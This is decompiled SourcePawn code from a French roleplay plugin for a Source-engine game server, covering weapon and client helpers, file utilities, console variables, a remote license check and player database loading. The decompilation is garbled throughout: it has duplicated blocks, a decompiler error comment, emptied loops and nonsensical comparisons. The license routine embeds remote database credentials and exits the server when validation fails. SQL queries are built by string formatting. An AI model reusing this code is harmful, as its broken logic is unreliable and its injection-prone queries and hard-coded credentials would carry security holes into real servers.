					if (subject > 0)
					{
						if (type == GetClientTeam(subject))
						{
							newSubject = subject;
						}
					}
					if (subject == -2)
					{
						new client = Team_GetAnyClient(type);
						if (client != -1)
						{
							newSubject = client;
						}
					}
				}
			}
		}
		new var5;
		if (type > ChatColorSubjectType:-3)
		{
			index = chatColorInfo[index][0][0][1];
			newSubject = Color_GetChatColorInfo(index, subject);
		}
		if (subject == -2)
		{
			subject = newSubject;
		}
		return newSubject;
	}
	while (!chatColorInfo[index][0][0][2])
	{
		new alternative = chatColorInfo[index][0][0][1];
		if (alternative == -1)
		{
			index = 0;
			if (index == -1)
			{
				index = 0;
			}
			new newSubject = -2;
			new ChatColorSubjectType:type = chatColorInfo[index][0][0][3];
			switch (type)
			{
				case -3:
				{
				}
				case -2:
				{
					newSubject = chatSubject;
				}
				case -1:
				{
					newSubject = -1;
				}
				case 0:
				{
					newSubject = 0;
				}
				default:
				{
					new var1;
					if (!checkTeamPlay)
					{
						new var2;
						if (subject > 0)
						{
							if (type == GetClientTeam(subject))
							{
								newSubject = subject;
							}
						}
						if (subject == -2)
						{
							new client = Team_GetAnyClient(type);
							if (client != -1)
							{
								newSubject = client;
							}
						}
					}
				}
			}
			new var5;
			if (type > ChatColorSubjectType:-3)
			{
				index = chatColorInfo[index][0][0][1];
				newSubject = Color_GetChatColorInfo(index, subject);
			}
			if (subject == -2)
			{
				subject = newSubject;
			}
			return newSubject;
		}
		index = alternative;
	}
	if (index == -1)
	{
		index = 0;
	}
	new newSubject = -2;
	new ChatColorSubjectType:type = chatColorInfo[index][0][0][3];
	switch (type)
	{
		case -3:
		{
		}
		case -2:
		{
			newSubject = chatSubject;
		}
		case -1:
		{
			newSubject = -1;
		}
		case 0:
		{
			newSubject = 0;
		}
		default:
		{
			new var1;
			if (!checkTeamPlay)
			{
				new var2;
				if (subject > 0)
				{
					if (type == GetClientTeam(subject))
					{
						newSubject = subject;
					}
				}
				if (subject == -2)
				{
					new client = Team_GetAnyClient(type);
					if (client != -1)
					{
						newSubject = client;
					}
				}
			}
		}
	}
	new var5;
	if (type > ChatColorSubjectType:-3)
	{
		index = chatColorInfo[index][0][0][1];
		newSubject = Color_GetChatColorInfo(index, subject);
	}
	if (subject == -2)
	{
		subject = newSubject;
	}
	return newSubject;
}

Weapon_IsValid(weapon)
{
	if (!IsValidEdict(weapon))
	{
		return 0;
	}
	return Entity_ClassNameMatches(weapon, "weapon_", 1);
}

Weapon_GetPrimaryAmmoType(weapon)
{
	return GetEntProp(weapon, PropType:1, "m_iPrimaryAmmoType", 4, 0);
}

Weapon_GetSecondaryAmmoType(weapon)
{
	return GetEntProp(weapon, PropType:1, "m_iSecondaryAmmoType", 4, 0);
}

Weapon_GetPrimaryClip(weapon)
{
	return GetEntProp(weapon, PropType:1, "m_iClip1", 4, 0);
}

Weapon_SetPrimaryClip(weapon, value)
{
	SetEntProp(weapon, PropType:1, "m_iClip1", value, 4, 0);
	return 0;
}

Weapon_SetPrimaryAmmoCount(weapon, value)
{
	SetEntProp(weapon, PropType:1, "m_iPrimaryAmmoCount", value, 4, 0);
	return 0;
}

Client_FindBySteamId(String:auth[])
{
	decl String:clientAuth[24];
	new client = 1;
	while (client <= MaxClients)
	{
		if (IsClientAuthorized(client))
		{
			GetClientAuthString(client, clientAuth, 21);
			if (StrEqual(auth, clientAuth, true))
			{
				return client;
			}
		}
		client++;
	}
	return -1;
}

bool:Client_ScreenFade(client, duration, mode, holdtime, r, g, b, a, bool:reliable)
{
	decl Handle:userMessage;
	new var1;
	if (reliable)
	{
		var1 = 4;
	}
	else
	{
		var1 = 0;
	}
	userMessage = StartMessageOne("Fade", client, var1);
	if (userMessage)
	{
		BfWriteShort(userMessage, duration);
		BfWriteShort(userMessage, holdtime);
		BfWriteShort(userMessage, mode);
		BfWriteByte(userMessage, r);
		BfWriteByte(userMessage, g);
		BfWriteByte(userMessage, b);
		BfWriteByte(userMessage, a);
		EndMessage();
		return true;
	}
	return false;
}

Client_SetScore(client, value)
{
	SetEntProp(client, PropType:1, "m_iFrags", value, 4, 0);
	return 0;
}

Client_SetDeaths(client, value)
{
	SetEntProp(client, PropType:1, "m_iDeaths", value, 4, 0);
	return 0;
}

Client_GetWeaponsOffset(client)
{
	static offset = -1;
	if (offset == -1)
	{
		offset = FindDataMapOffs(client, "m_hMyWeapons", 0, 0);
	}
	return offset;
}

Client_GetActiveWeapon(client)
{
	new weapon = GetEntPropEnt(client, PropType:1, "m_hActiveWeapon", 0);
	if (!Entity_IsValid(weapon))
	{
		return -1;
	}
	return weapon;
}

Client_GetActiveWeaponName(client, String:buffer[], size)
{
	new weapon = Client_GetActiveWeapon(client);
	if (weapon == -1)
	{
		buffer[0] = 0;
		return -1;
	}
	Entity_GetClassName(weapon, buffer, size);
	return weapon;
}

Client_SetActiveWeapon(client, weapon)
{
	SetEntPropEnt(client, PropType:1, "m_hActiveWeapon", weapon, 0);
	ChangeEdictState(client, FindDataMapOffs(client, "m_hActiveWeapon", 0, 0));
	return 0;
}

bool:Client_ChangeWeapon(client, String:className[])
{
	new weapon = Client_GetWeapon(client, className);
	if (weapon == -1)
	{
		return false;
	}
	Client_SetActiveWeapon(client, weapon);
	return true;
}

Client_ChangeToLastWeapon(client)
{
	new weapon = Client_GetLastActiveWeapon(client);
	if (weapon == -1)
	{
		weapon = Client_GetDefaultWeapon(client);
		if (weapon == -1)
		{
			weapon = Client_GetFirstWeapon(client);
			if (weapon == -1)
			{
				return -1;
			}
		}
	}
	Client_SetActiveWeapon(client, weapon);
	return weapon;
}

Client_GetLastActiveWeapon(client)
{
	new weapon = GetEntPropEnt(client, PropType:1, "m_hLastWeapon", 0);
	if (!Entity_IsValid(weapon))
	{
		return -1;
	}
	return weapon;
}

bool:Client_RemoveWeapon(client, String:className[], bool:firstOnly, bool:clearAmmo)
{
	new offset = Client_GetWeaponsOffset(client) + -4;
	new i = 0;
	while (i < 48)
	{
		offset += 4;
		new weapon = GetEntDataEnt2(client, offset);
		if (Weapon_IsValid(weapon))
		{
			if (!Entity_ClassNameMatches(weapon, className, 0))
			{
			}
			else
			{
				if (clearAmmo)
				{
					Client_SetWeaponPlayerAmmoEx(client, weapon, 0, 0);
				}
				if (weapon == Client_GetActiveWeapon(client))
				{
					Client_ChangeToLastWeapon(client);
				}
				if (RemovePlayerItem(client, weapon))
				{
					Entity_Kill(weapon);
				}
				if (firstOnly)
				{
					return true;
				}
			}
		}
		i++;
	}
	return false;
}

Client_RemoveAllWeapons(client, String:exclude[], bool:clearAmmo)
{
	new offset = Client_GetWeaponsOffset(client) + -4;
	new numWeaponsRemoved = 0;
	new i = 0;
	while (i < 48)
	{
		offset += 4;
		new weapon = GetEntDataEnt2(client, offset);
		if (Weapon_IsValid(weapon))
		{
			new var1;
			if (exclude[0])
			{
				Client_SetActiveWeapon(client, weapon);
			}
			if (clearAmmo)
			{
				Client_SetWeaponPlayerAmmoEx(client, weapon, 0, 0);
			}
			if (RemovePlayerItem(client, weapon))
			{
				Entity_Kill(weapon);
			}
			numWeaponsRemoved++;
		}
		i++;
	}
	return numWeaponsRemoved;
}

Client_GetWeapon(client, String:className[])
{
	new offset = Client_GetWeaponsOffset(client) + -4;
	new i = 0;
	while (i < 48)
	{
		offset += 4;
		new weapon = GetEntDataEnt2(client, offset);
		if (Weapon_IsValid(weapon))
		{
			if (Entity_ClassNameMatches(weapon, className, 0))
			{
				return weapon;
			}
		}
		i++;
	}
	return -1;
}

Client_GetDefaultWeapon(client)
{
	decl String:weaponName[80];
	if (Client_GetDefaultWeaponName(client, weaponName, 80))
	{
		return -1;
	}
	return Client_GetWeapon(client, weaponName);
}

bool:Client_GetDefaultWeaponName(client, String:buffer[], size)
{
	if (!GetClientInfo(client, "cl_defaultweapon", buffer, size))
	{
		buffer[0] = 0;
		return false;
	}
	return true;
}

Client_GetFirstWeapon(client)
{
	new offset = Client_GetWeaponsOffset(client) + -4;
	new i = 0;
	while (i < 48)
	{
		offset += 4;
		new weapon = GetEntDataEnt2(client, offset);
		if (!Weapon_IsValid(weapon))
		{
			i++;
		}
		else
		{
			return weapon;
		}
		i++;
	}
	return -1;
}

bool:Client_GetWeaponPlayerAmmo(client, String:className[], &primaryAmmo, &secondaryAmmo)
{
	new weapon = Client_GetWeapon(client, className);
	if (weapon == -1)
	{
		return false;
	}
	new offset_ammo = FindDataMapOffs(client, "m_iAmmo", 0, 0);
	if (primaryAmmo != -1)
	{
		new offset = Weapon_GetPrimaryAmmoType(weapon) * 4 + offset_ammo;
		primaryAmmo = GetEntData(client, offset, 4);
	}
	if (secondaryAmmo != -1)
	{
		new offset = Weapon_GetSecondaryAmmoType(weapon) * 4 + offset_ammo;
		secondaryAmmo = GetEntData(client, offset, 4);
	}
	return true;
}

Client_SetWeaponPlayerAmmoEx(client, weapon, primaryAmmo, secondaryAmmo)
{
	new offset_ammo = FindDataMapOffs(client, "m_iAmmo", 0, 0);
	if (primaryAmmo != -1)
	{
		new offset = Weapon_GetPrimaryAmmoType(weapon) * 4 + offset_ammo;
		SetEntData(client, offset, primaryAmmo, 4, true);
	}
	if (secondaryAmmo != -1)
	{
		new offset = Weapon_GetSecondaryAmmoType(weapon) * 4 + offset_ammo;
		SetEntData(client, offset, secondaryAmmo, 4, true);
	}
	return 0;
}

bool:Client_Shake(client, command, Float:amplitude, Float:frequency, Float:duration)
{
	new Handle:userMessage = StartMessageOne(printToChat_excludeclient, client, 0);
	if (userMessage)
	{
		if (command == 1)
		{
			amplitude = 0;
		}
		else
		{
			if (amplitude <= 0)
			{
				return false;
			}
		}
		BfWriteByte(userMessage, command);
		BfWriteFloat(userMessage, amplitude);
		BfWriteFloat(userMessage, frequency);
		BfWriteFloat(userMessage, duration);
		EndMessage();
		return true;
	}
	return false;
}

public bool:_smlib_TraceEntityFilter(entity, contentsMask)
{
	return entity == 0;
}


/* ERROR! Index was outside the bounds of the array. */
 function "_smlib_Timer_Effect_Fade" (number 90)
bool:File_GetBaseName(String:path[], String:buffer[], size)
{
	if (path[0])
	{
		new pos_start = FindCharInString(path, 47, true);
		if (pos_start == -1)
		{
			pos_start = FindCharInString(path, 92, true);
		}
		pos_start++;
		strcopy(buffer, size, path[pos_start]);
		return false;
	}
	buffer[0] = 0;
	return false;
}

bool:File_GetDirName(String:path[], String:buffer[], size)
{
	if (path[0])
	{
		new pos_start = FindCharInString(path, 47, true);
		if (pos_start == -1)
		{
			pos_start = FindCharInString(path, 92, true);
			if (pos_start == -1)
			{
				buffer[0] = 0;
				return false;
			}
		}
		strcopy(buffer, size, path);
		buffer[pos_start] = 0;
		return false;
	}
	buffer[0] = 0;
	return false;
}

bool:File_GetFileName(String:path[], String:buffer[], size)
{
	if (path[0])
	{
		File_GetBaseName(path, buffer, size);
		new pos_ext = FindCharInString(buffer, 46, true);
		if (pos_ext != -1)
		{
			buffer[pos_ext] = 0;
		}
		return false;
	}
	buffer[0] = 0;
	return false;
}

File_GetExtension(String:path[], String:buffer[], size)
{
	new extpos = FindCharInString(path, 46, true);
	if (extpos == -1)
	{
		buffer[0] = 0;
		return 0;
	}
	extpos++;
	strcopy(buffer, size, path[extpos]);
	return 0;
}

File_AddToDownloadsTable(String:path[], bool:recursive, String:ignoreExts[][], size)
{
	if (path[0])
	{
		if (FileExists(path, false))
		{
			decl String:fileExtension[4];
			File_GetExtension(path, fileExtension, 4);
			new var1;
			if (StrEqual(fileExtension, base64_sTable, false))
			{
				return 0;
			}
			if (Array_FindString(ignoreExts, size, fileExtension, true, 0) != -1)
			{
				return 0;
			}
			decl String:path_new[256];
			strcopy(path_new, 256, path);
			ReplaceString(path_new, 256, "//", "/", true);
			AddFileToDownloadsTable(path_new);
		}
		else
		{
			new var2;
			if (recursive)
			{
				decl String:dirEntry[256];
				new Handle:__dir = OpenDirectory(path);
				while (ReadDirEntry(__dir, dirEntry, 256, 0))
				{
					new var3;
					if (StrEqual(dirEntry, ".", true))
					{
					}
				}
				CloseHandle(__dir);
			}
			if (FindCharInString(path, 42, true))
			{
				decl String:fileExtension[4];
				File_GetExtension(path, fileExtension, 4);
				if (StrEqual(fileExtension, "*", true))
				{
					decl String:dirName[256];
					decl String:fileName[256];
					decl String:dirEntry[256];
					File_GetDirName(path, dirName, 256);
					File_GetFileName(path, fileName, 256);
					StrCat(fileName, 256, ".");
					new Handle:__dir = OpenDirectory(dirName);
					while (ReadDirEntry(__dir, dirEntry, 256, 0))
					{
						new var4;
						if (StrEqual(dirEntry, ".", true))
						{
						}
					}
					CloseHandle(__dir);
				}
			}
		}
		return 0;
	}
	return 0;
}

bool:File_Copy(String:source[], String:destination[])
{
	new Handle:file_source = OpenFile(source, "rb");
	if (file_source)
	{
		new Handle:file_destination = OpenFile(destination, "wb");
		if (file_destination)
		{
			decl buffer[32];
			new cache = 0;
			while (!IsEndOfFile(file_source))
			{
				cache = ReadFile(file_source, buffer, 32, 1);
				WriteFile(file_destination, buffer, cache, 1);
			}
			CloseHandle(file_source);
			CloseHandle(file_destination);
			return true;
		}
		CloseHandle(file_source);
		return false;
	}
	return false;
}

bool:File_CopyRecursive(String:path[], String:destination[], bool:stop_on_error, dirMode)
{
	if (FileExists(path, false))
	{
		return File_Copy(path, destination);
	}
	if (DirExists(path))
	{
		return Sub_File_CopyRecursive(path, destination, stop_on_error, FileType:1, dirMode);
	}
	return false;
}

bool:Sub_File_CopyRecursive(String:path[], String:destination[], bool:stop_on_error, FileType:fileType, dirMode)
{
	if (fileType == FileType:2)
	{
		return File_Copy(path, destination);
	}
	if (fileType == FileType:1)
	{
		new var1;
		if (!CreateDirectory(destination, dirMode))
		{
			return false;
		}
		new Handle:directory = OpenDirectory(path);
		if (directory)
		{
			decl String:source_buffer[256];
			decl String:destination_buffer[256];
			new FileType:type = 0;
			while (ReadDirEntry(directory, source_buffer, 256, type))
			{
				new var2;
				if (StrEqual(source_buffer, "..", true))
				{
				}
			}
			CloseHandle(directory);
		}
		return false;
	}
	else
	{
		if (fileType)
		{
		}
		else
		{
			return false;
		}
	}
	return true;
}

Server_GetPort()
{
	static Handle:cvHostport;
	if (!cvHostport)
	{
		cvHostport = FindConVar("hostport");
	}
	if (cvHostport)
	{
		new port = GetConVarInt(cvHostport);
		return port;
	}
	return 0;
}

RegisterConVars()
{
	hStartMoney = CreateConVar("rp_start_money", "25000", "Argent distribue a un joueur lors de sa premiere connexion.", 0, false, 0, false, 0);
	hPanelLink = CreateConVar("rp_panel_link", "Site: http://www.sphex.fr/$Teamspeak: sphex.fr", "Texte a afficher dans le panel Liens Utiles, vous pouvez ecrire sur maximum 5 lignes en utilisant le signe $ comme separateur Exemple: 'http://www.sphex.fr$Teamspeak3:sphex.fr$Coucou'.", 0, false, 0, false, 0);
	hDebugMode = CreateConVar("rp_debugmode", "0", "Activer ou non le mode debug", 0, false, 0, false, 0);
	hShowNoteLink = CreateConVar("rp_shownote_link", "http://www.sphex.fr", "Lien complet qui redirigera les joueurs tapant /shownote", 0, false, 0, false, 0);
	hAllowCars = CreateConVar("rp_allow_cars", "1", "Autoriser ou non les voitures sur le serveur", 0, false, 0, false, 0);
	hAllowTazer = CreateConVar("rp_allow_tazer", "0", "Autorise ou non le tazer pour les policiers", 0, false, 0, false, 0);
	StartMoney = GetConVarInt(hStartMoney);
	GetConVarString(hPanelLink, PanelLink, 255);
	DebugMode = GetConVarBool(hDebugMode);
	GetConVarString(hShowNoteLink, ShowNoteLink, 255);
	AllowCars = GetConVarBool(hAllowCars);
	AllowTazer = GetConVarBool(hAllowTazer);
	HookConVarChange(hStartMoney, OnConVarChanged);
	HookConVarChange(hPanelLink, OnConVarChanged);
	HookConVarChange(hDebugMode, OnConVarChanged);
	HookConVarChange(hShowNoteLink, OnConVarChanged);
	HookConVarChange(hAllowCars, OnConVarChanged);
	HookConVarChange(hAllowTazer, OnConVarChanged);
	AutoExecConfig(true, "plugin.lightRP", "sourcemod");
	return 0;
}

public OnConVarChanged(Handle:convar, String:oldValue[], String:newValue[])
{
	if (hStartMoney == convar)
	{
		StartMoney = StringToInt(newValue, 10);
	}
	else
	{
		if (hPanelLink == convar)
		{
			strcopy(PanelLink, 255, newValue);
		}
		if (hDebugMode == convar)
		{
			DebugMode = StringToInt(newValue, 10);
		}
		if (hShowNoteLink == convar)
		{
			strcopy(ShowNoteLink, 255, newValue);
		}
		if (hAllowCars == convar)
		{
			AllowCars = StringToInt(newValue, 10);
		}
		if (hAllowTazer == convar)
		{
			AllowTazer = StringToInt(newValue, 10);
		}
	}
	return 0;
}

ResetVar(client)
{
	if (!Loaded[client][0][0])
	{
		ItemColorBall[client] = 0;
		ColorBallCount[client] = 0;
		PhoneStop[client] = 0;
		TazerTimer[client] = 0;
		gObj[client] = 0;
		gDistance[client] = 0;
		CarImpala[client] = 0;
		CarPoliceImpala[client] = 0;
		CarMustang[client] = 0;
		CarTacoma[client] = 0;
		CarMustangGT[client] = 0;
		CarDirtBike[client] = 0;
		CarFordGT[client] = 0;
		CarImpalaHP[client] = 0;
		CarPoliceImpalaHP[client] = 0;
		CarMustangHP[client] = 0;
		CarTacomaHP[client] = 0;
		CarMustangGTHP[client] = 0;
		CarDirtBikeHP[client] = 0;
		CarFordGTHP[client] = 0;
		CarHorn[client] = 0;
		HaveJetPack[client] = 0;
		JetPackGaz[client] = 0;
		Answered[client] = 0;
		Channel[client] = 0;
		NBKill[client] = 0;
		PlayTime[client] = 0;
		TempPTTime[client] = 0;
		PTMinutes[client] = 0;
		PTHours[client] = 0;
		PlayTimeSinceLogin[client] = 0;
		money[client] = 0;
		bank[client] = 0;
		JobID[client] = 0;
		RankID[client] = 0;
		ActualThirdPerson[client] = 0;
		JailTime[client] = 0;
		JailHours[client] = 0;
		JailMinutes[client] = 0;
		TempJailTime[client] = 0;
		TempJailHours[client] = 0;
		FirstJail[client] = 1;
		Salary[client] = 0;
		EspionMode[client] = 0;
		ragdoll[client] = -1;
		CutRestant[client] = 0;
		HasDiplome[client] = 0;
		HasPermisLeger[client] = 0;
		HasPermisLourd[client] = 0;
		player_respawn_wait[client] = 0;
		RPPoints[client] = 0;
		CanOneShot[client] = 0;
		BeInvincible[client] = 0;
		FlameLeft[client] = 0;
		HasHEFreeze[client] = 0;
		HasHEFire[client] = 0;
		Skin[client] = 0;
		ShowWeapons[client] = 0;
		ShowDrugs[client] = 0;
		ShowComposant[client] = 0;
		ShowOther[client] = 0;
		CanGetKit[client] = 0;
		IsInJail[client] = 0;
		OnMafia[client] = 0;
		OnDisco[client] = 0;
		OnAmmuNation[client] = 0;
		OnHopital[client] = 0;
		OnDealer[client] = 0;
		OnAirControl[client] = 0;
		OnAtlantic[client] = 0;
		OnComico[client] = 0;
		OnDistrib1[client] = 0;
		OnDistrib2[client] = 0;
		OnDistrib3[client] = 0;
		OnDistrib4[client] = 0;
		OnBanque[client] = 0;
		OnTriades[client] = 0;
		OnDetectives[client] = 0;
		OnTribunal[client] = 0;
		OnEpicerie[client] = 0;
		OnArnaqueur[client] = 0;
		OnCarShop[client] = 0;
		OnPizzeria[client] = 0;
		OnBar[client] = 0;
		OnCoach[client] = 0;
		OnIkea[client] = 0;
		OnMoniteur[client] = 0;
		lastHealth[client] = 100;
		CanUseTazer[client] = 1;
		LaserOn[client] = 0;
		IsCrochette[client] = 0;
		ArnaqueMode[client] = 0;
		ArnaqueJobID[client] = 0;
		cibleID[client] = 0;
		HasKillCible[client] = 0;
		BoostDispo[client] = 0;
		BoostDeagle[client] = 0;
		BoostVitesse[client] = 0;
		BoostLife[client] = 0;
		BoostCut[client] = 0;
		BoostInv[client] = 0;
		isInvi[client] = 0;
		ItemLanceFlamme[client] = 0;
		ItemHEFreeze[client] = 0;
		ItemHEFire[client] = 0;
		ItemPizza[client] = 0;
		KitCrochettage[client] = 0;
		WeaponGlock[client] = 0;
		WeaponUSP[client] = 0;
		Weaponp228[client] = 0;
		Weapondeagle[client] = 0;
		Weaponelite[client] = 0;
		Weaponfiveseven[client] = 0;
		Weaponm3[client] = 0;
		Weaponxm1014[client] = 0;
		Weapongalil[client] = 0;
		Weaponak47[client] = 0;
		Weaponscout[client] = 0;
		Weaponsg552[client] = 0;
		Weaponawp[client] = 0;
		Weapong3sg1[client] = 0;
		Weaponfamas[client] = 0;
		Weaponm4a1[client] = 0;
		Weaponaug[client] = 0;
		Weaponsg550[client] = 0;
		Weaponmac10[client] = 0;
		Weapontmp[client] = 0;
		Weaponmp5navy[client] = 0;
		Weaponump45[client] = 0;
		Weaponp90[client] = 0;
		Weaponm249[client] = 0;
		StuffCartouche[client] = 0;
		StuffGrenade[client] = 0;
		StuffFlash[client] = 0;
		StuffFumi[client] = 0;
		StuffKevelar[client] = 0;
		DrogueLSD[client] = 0;
		DrogueHero[client] = 0;
		DrogueExtasy[client] = 0;
		DrogueCoke[client] = 0;
		DrogueWeed[client] = 0;
		ItemJetPack[client] = 0;
		ItemGazAC[client] = 0;
		KitSoins[client] = 0;
		ChirurgiePoumon[client] = 0;
		ChirurgieSouplesse[client] = 0;
		ChirurgieAda[client] = 0;
		ItemTicket10[client] = 0;
		ItemTicket50[client] = 0;
		ItemTicket100[client] = 0;
		ItemTicket500[client] = 0;
		PlayerHasCB[client] = 0;
		PlayerHasRIB[client] = 0;
		DiplomeTir[client] = 0;
		PermisLeger[client] = 0;
		PermisLourd[client] = 0;
		ItemCafe[client] = 0;
		ItemNuteChoco[client] = 0;
		ItemGateauChoco[client] = 0;
		ItemSucetteMenthe[client] = 0;
		ItemDroom[client] = 0;
		CanPlayGlace[client] = 0;
		ItemVodka[client] = 0;
		ItemRedbull[client] = 0;
		UnlimitedAmmo[client] = 0;
		OneShotMode[client] = 0;
		if (AfkTimer[client][0][0])
		{
			CloseHandle(AfkTimer[client][0][0]);
			AfkTimer[client] = 0;
		}
		if (hStopPiratage[client][0][0])
		{
			CloseHandle(hStopPiratage[client][0][0]);
			hStopPiratage[client] = 0;
		}
		CreateTimer(0.1, CreateSQLAccount, client, 0);
	}
	return 0;
}

public CheckValidLicense()
{
	if (tDB)
	{
		CloseHandle(tDB);
	}
	tDB = 0;
	new Handle:kv = CreateKeyValues("rplicense", "", "");
	KvSetString(kv, "driver", "mysql");
	KvSetString(kv, "host", "sphex.fr");
	KvSetString(kv, "database", "RPLicense");
	KvSetString(kv, "user", "roleplay");
	KvSetString(kv, "pass", abc);
	KvSetString(kv, "port", "3306");
	decl String:errorbuffer[256];
	tDB = SQL_ConnectCustom(kv, errorbuffer, 255, false);
	CloseHandle(kv);
	if (tDB)
	{
		dbTry = 0;
		decl String:buffer2[512];
		new states = 0;
		new actualtime = GetTime({0,0});
		decl String:lockip[128];
		decl String:HostIP[128];
		decl String:AddressIP[128];
		decl pieces[4];
		new longip = GetConVarInt(FindConVar("hostip"));
		pieces[0] = longip >>> 24 & 255;
		pieces[1] = longip >>> 16 & 255;
		pieces[2] = longip >>> 8 & 255;
		pieces[3] = longip & 255;
		Format(HostIP, 128, "%d.%d.%d.%d", pieces, pieces[1], pieces[2], pieces[3]);
		new port = Server_GetPort();
		Format(AddressIP, 128, "%s:%i", HostIP, port);
		Format(buffer2, 512, "SELECT * FROM RP_License WHERE lockip = '%s';", AddressIP);
		new Handle:query = SQL_Query(tDB, buffer2, -1);
		if (SQL_GetRowCount(query))
		{
			while (SQL_FetchRow(query))
			{
				PLUGIN_ID = SQL_FetchInt(query, 0, 0);
				expireTime = SQL_FetchInt(query, 1, 0);
				states = SQL_FetchInt(query, 2, 0);
				SQL_FetchString(query, 3, VersionLRP, 64, 0);
				SQL_FetchString(query, 5, lockip, 128, 0);
			}
		}
		new var1;
		if (actualtime >= expireTime)
		{
			LogMessage("License invalide");
			ServerCommand("exit");
			ServerCommand("sm plugins unload Roleplay");
		}
		else
		{
			LogMessage("License validee");
		}
		if (StrEqual(AddressIP, lockip, true))
		{
			LogMessage("Machine validee");
		}
		else
		{
			LogMessage("Machine invalidee");
			ServerCommand("exit");
			ServerCommand("sm plugins unload Roleplay");
		}
		Format(buffer2, 512, "SELECT * FROM RP_Functionalities WHERE id = %i;", PLUGIN_ID);
		query = SQL_Query(tDB, buffer2, -1);
		if (SQL_GetRowCount(query))
		{
			while (SQL_FetchRow(query))
			{
				Functionalitie[0] = SQL_FetchInt(query, 1, 0);
				Functionalitie[1] = SQL_FetchInt(query, 2, 0);
				Functionalitie[2] = SQL_FetchInt(query, 3, 0);
				Functionalitie[3] = SQL_FetchInt(query, 4, 0);
			}
		}
		CloseHandle(query);
		if (PluginStarted)
		{
			CreateTimer(1, SaveAll, any:0, 0);
		}
		else
		{
			StartRoleplay();
		}
	}
	else
	{
		if (dbTry < 20)
		{
			if (DebugMode)
			{
				LogMessage("Essai %i", dbTry);
			}
			dbTry += 1;
			CreateTimer(1, CheckLicenseDB, any:0, 0);
		}
		else
		{
			if (DebugMode)
			{
				LogMessage("Connexion impossible");
			}
			ServerCommand("exit");
			ServerCommand("sm plugins unload Roleplay");
		}
	}
	return 0;
}

public DBRPLoadClock()
{
	decl String:error[256];
	new Handle:db = SQL_Connect("Roleplay", true, error, 255);
	decl String:buffer[512];
	Format(buffer, 512, "SELECT * FROM RP_Misc;");
	SQL_TQuery(db, DBRPLoadClock2, buffer, -1, DBPriority:1);
	CloseHandle(db);
	return 0;
}

public DBRPLoadClock2(Handle:owner, Handle:hndl, String:error[], data)
{
	if (hndl)
	{
		while (SQL_FetchRow(hndl))
		{
			Days = SQL_FetchInt(hndl, 0, 0);
			Months = SQL_FetchInt(hndl, 1, 0);
			Years = SQL_FetchInt(hndl, 2, 0);
		}
	}
	else
	{
		if (DebugMode)
		{
			LogError("Query failed! %s", error);
		}
	}
	return 0;
}

public DBRPSaveClock()
{
	decl String:query[512];
	decl String:error[256];
	new Handle:db = SQL_Connect("Roleplay", true, error, 255);
	decl String:logFile[256];
	BuildPath(PathType:0, logFile, 256, "logs/SQL.log");
	new Handle:logf = OpenFile(logFile, "a");
	Format(query, 512, "UPDATE RP_Misc SET `DAY` = %i, `MONTH` = %i, `YEAR` = %i WHERE `ID` = 1", Days, Months, Years);
	WriteFileLine(logf, query);
	if (!SQL_FastQuery(db, query, -1))
	{
		SQL_GetError(db, error, 255);
		WriteFileLine(logf, error);
	}
	FlushFile(logf);
	CloseHandle(db);
	return 0;
}

InitializeClientonDB(client)
{
	decl String:SteamId[256];
	decl String:buffer[256];
	GetClientAuthString(client, SteamId, 255);
	decl String:error[256];
	new Handle:db = SQL_Connect("Roleplay", true, error, 255);
	Format(buffer, 255, "SELECT * FROM RP_Players WHERE STEAMID = '%s';", SteamId);
	new Handle:query = SQL_Query(db, buffer, -1);
	decl String:Found_Steam[64];
	new timestamp = 0;
	if (query)
	{
		SQL_Rewind(query);
		new bool:fetch = SQL_FetchRow(query);
		if (!fetch)
		{
			InsertPlayer(client);
		}
		else
		{
			SQL_FetchString(query, 0, Found_Steam, 64, 0);
			timestamp = SQL_FetchInt(query, 1, 0);
			money[client] = SQL_FetchInt(query, 3, 0);
			bank[client] = SQL_FetchInt(query, 4, 0);
			JobID[client] = SQL_FetchInt(query, 5, 0);
			RankID[client] = SQL_FetchInt(query, 6, 0);
			JailTime[client] = SQL_FetchInt(query, 7, 0);
			CutRestant[client] = SQL_FetchInt(query, 8, 0);
			PlayerHasCB[client] = SQL_FetchInt(query, 9, 0);
			PlayerHasRIB[client] = SQL_FetchInt(query, 10, 0);
			HasPermisLeger[client] = SQL_FetchInt(query, 11, 0);
			HasPermisLourd[client] = SQL_FetchInt(query, 12, 0);
			NBKill[client] = SQL_FetchInt(query, 13, 0);
			PlayTime[client] = SQL_FetchInt(query, 14, 0);
			DefRestant[client] = SQL_FetchInt(query, 16, 0);
			Group[client] = SQL_FetchInt(query, 17, 0);
		}
		Format(buffer, 255, "SELECT * FROM `RP_Items` WHERE STEAMID = '%s';", SteamId);
		query = SQL_Query(db, buffer, -1);
		if (SQL_GetRowCount(query))
		{
			while (SQL_FetchRow(query))
			{
				SQL_FetchString(query, 0, Found_Steam, 64, 0);
				KitCrochettage[client] = SQL_FetchInt(query, 1, 0);
				StuffGrenade[client] = SQL_FetchInt(query, 2, 0);
				StuffFlash[client] = SQL_FetchInt(query, 3, 0);
				StuffFumi[client] = SQL_FetchInt(query, 4, 0);
				StuffKevelar[client] = SQL_FetchInt(query, 5, 0);
				WeaponGlock[client] = SQL_FetchInt(query, 6, 0);
				WeaponUSP[client] = SQL_FetchInt(query, 7, 0);
				Weaponp228[client] = SQL_FetchInt(query, 8, 0);
				Weapondeagle[client] = SQL_FetchInt(query, 9, 0);
				Weaponelite[client] = SQL_FetchInt(query, 10, 0);
				Weaponfiveseven[client] = SQL_FetchInt(query, 11, 0);
				Weaponm3[client] = SQL_FetchInt(query, 12, 0);
				Weaponxm1014[client] = SQL_FetchInt(query, 13, 0);
				Weapongalil[client] = SQL_FetchInt(query, 14, 0);
				Weaponak47[client] = SQL_FetchInt(query, 15, 0);
				Weaponscout[client] = SQL_FetchInt(query, 16, 0);
				Weaponsg552[client] = SQL_FetchInt(query, 17, 0);
				Weaponawp[client] = SQL_FetchInt(query, 18, 0);
				Weapong3sg1[client] = SQL_FetchInt(query, 19, 0);
				Weaponfamas[client] = SQL_FetchInt(query, 20, 0);
				Weaponm4a1[client] = SQL_FetchInt(query, 21, 0);
				Weaponaug[client] = SQL_FetchInt(query, 22, 0);
				Weaponsg550[client] = SQL_FetchInt(query, 23, 0);
				Weaponmac10[client] = SQL_FetchInt(query, 24, 0);
				Weapontmp[client] = SQL_FetchInt(query, 25, 0);
				Weaponmp5navy[client] = SQL_FetchInt(query, 26, 0);
				Weaponump45[client] = SQL_FetchInt(query, 27, 0);
				Weaponp90[client] = SQL_FetchInt(query, 28, 0);
